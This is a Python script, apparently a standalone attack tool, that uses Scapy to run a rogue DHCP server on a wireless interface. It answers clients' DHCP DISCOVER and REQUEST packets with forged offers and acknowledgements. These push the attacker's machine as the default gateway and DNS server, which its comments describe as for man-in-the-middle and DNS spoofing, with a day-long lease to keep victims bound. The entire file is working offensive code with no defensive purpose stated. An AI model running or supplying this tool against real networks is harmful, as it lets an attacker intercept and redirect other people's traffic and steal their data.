#!/usr/bin/env python3
"""
rogue_server.py — Rogue DHCP Server
=====================================
Listens for DHCP DISCOVER / REQUEST and responds with
attacker-controlled network config (gateway, DNS, etc.)
Uses Scapy only.
"""

import time
from scapy.all import (
    sniff, sendp, Ether, IP, UDP, BOOTP, DHCP,
    get_if_hwaddr, conf
)

# ─── Attacker-controlled config ───────────────────
IFACE        = "wlan0"           # interface to listen/send on
ROGUE_IP     = "192.168.1.2"   # this rogue server's IP
ROGUE_MAC    = None              # auto-detected from iface if None
GATEWAY_IP   = "192.168.1.2"   # push attacker as default gateway (MITM)
DNS_SERVER   = "192.168.1.2"   # push attacker as DNS (for DNS spoofing)
SUBNET_MASK  = "255.255.255.0"
LEASE_TIME   = 86400             # 1 day (keep victim bound)
POOL_START   = "192.168.1.210"
POOL_END     = "192.168.1.250"
# ──────────────────────────────────────────────────


def generate_pool(start: str, end: str) -> list:
    """Generate list of IPs between start and end (inclusive)."""
    def ip_to_int(ip):
        parts = list(map(int, ip.split(".")))
        return (parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]

    def int_to_ip(n):
        return f"{(n>>24)&255}.{(n>>16)&255}.{(n>>8)&255}.{n&255}"

    return [int_to_ip(i) for i in range(ip_to_int(start), ip_to_int(end) + 1)]


def mac_str_to_bytes(mac: str) -> bytes:
    return bytes(int(b, 16) for b in mac.split(":"))


# Simple pool — just pop from the list
_pool = generate_pool(POOL_START, POOL_END)
_mac_to_ip: dict[str, str] = {}   # mac → assigned IP


def get_ip_for(mac: str) -> str | None:
    """Return existing assignment or allocate a new one."""
    if mac in _mac_to_ip:
        return _mac_to_ip[mac]
    if not _pool:
        print(f"[!] Pool exhausted — cannot assign to {mac}")
        return None
    ip = _pool.pop(0)
    _mac_to_ip[mac] = ip
    return ip


# ─── Packet handlers ──────────────────────────────

def handle(pkt) -> None:
    if DHCP not in pkt or BOOTP not in pkt:
        return

    # Extract message-type
    msg_type = None
    for opt in pkt[DHCP].options:
        if isinstance(opt, tuple) and opt[0] == "message-type":
            msg_type = opt[1]
            break
    if msg_type is None:
        return

    src_mac = pkt[Ether].src.lower()

    if msg_type == 1:   # DISCOVER
        print(f"[DISCOVER] from {src_mac}")
        offered_ip = get_ip_for(src_mac)
        if offered_ip:
            print(f"[OFFER]    {src_mac}  →  {offered_ip}")
            send_offer(pkt, src_mac, offered_ip)

    elif msg_type == 3:  # REQUEST
        requested_ip = None
        server_id    = None
        for opt in pkt[DHCP].options:
            if isinstance(opt, tuple):
                if opt[0] == "requested_addr":
                    requested_ip = opt[1]
                if opt[0] == "server_id":
                    server_id = opt[1]

        # Only reply if the client picked us (or no server_id set)
        if server_id and server_id != ROGUE_IP:
            return

        ip = requested_ip or _mac_to_ip.get(src_mac)
        if not ip:
            return

        _mac_to_ip[src_mac] = ip   # confirm mapping
        print(f"[ACK]      {src_mac}  →  {ip}")
        send_ack(pkt, src_mac, ip)


def send_offer(pkt, client_mac: str, offered_ip: str) -> None:
    xid = pkt[BOOTP].xid
    server_mac = ROGUE_MAC or get_if_hwaddr(IFACE)

    offer = (
        Ether(src=server_mac, dst="ff:ff:ff:ff:ff:ff")
        / IP(src=ROGUE_IP, dst="255.255.255.255")
        / UDP(sport=67, dport=68)
        / BOOTP(
            op=2,
            xid=xid,
            yiaddr=offered_ip,
            siaddr=ROGUE_IP,
            chaddr=mac_str_to_bytes(client_mac) + b"\x00" * 10,
            flags=0x8000,
        )
        / DHCP(options=[
            ("message-type", "offer"),
            ("server_id",    ROGUE_IP),
            ("lease_time",   LEASE_TIME),
            ("subnet_mask",  SUBNET_MASK),
            ("router",       GATEWAY_IP),
            ("name_server",  DNS_SERVER),
            "end",
        ])
    )
    sendp(offer, iface=IFACE, verbose=False)


def send_ack(pkt, client_mac: str, ip: str) -> None:
    xid = pkt[BOOTP].xid
    server_mac = ROGUE_MAC or get_if_hwaddr(IFACE)

    ack = (
        Ether(src=server_mac, dst="ff:ff:ff:ff:ff:ff")
        / IP(src=ROGUE_IP, dst="255.255.255.255")
        / UDP(sport=67, dport=68)
        / BOOTP(
            op=2,
            xid=xid,
            yiaddr=ip,
            siaddr=ROGUE_IP,
            chaddr=mac_str_to_bytes(client_mac) + b"\x00" * 10,
            flags=0x8000,
        )
        / DHCP(options=[
            ("message-type", "ack"),
            ("server_id",    ROGUE_IP),
            ("lease_time",   LEASE_TIME),
            ("subnet_mask",  SUBNET_MASK),
            ("router",       GATEWAY_IP),
            ("name_server",  DNS_SERVER),
            "end",
        ])
    )
    sendp(ack, iface=IFACE, verbose=False)


# ─── Entry point ──────────────────────────────────

if __name__ == "__main__":
    import sys
    iface = sys.argv[1] if len(sys.argv) > 1 else IFACE
    IFACE = iface

    print(f"""
  ╔══════════════════════════════════════╗
  ║        ROGUE DHCP SERVER             ║
  ╠══════════════════════════════════════╣
  ║  Interface : {IFACE:<24}║
  ║  Rogue IP  : {ROGUE_IP:<24}║
  ║  Gateway   : {GATEWAY_IP:<24}║
  ║  DNS       : {DNS_SERVER:<24}║
  ║  Pool      : {POOL_START} – {POOL_END:<9}║
  ╚══════════════════════════════════════╝
""")

    try:
        sniff(
            iface=IFACE,
            filter="udp and (port 67 or port 68)",
            prn=handle,
            store=False,
        )
    except KeyboardInterrupt:
        print("\n[*] Stopped. Assignments made:")
        for mac, ip in _mac_to_ip.items():
            print(f"    {mac}  →  {ip}")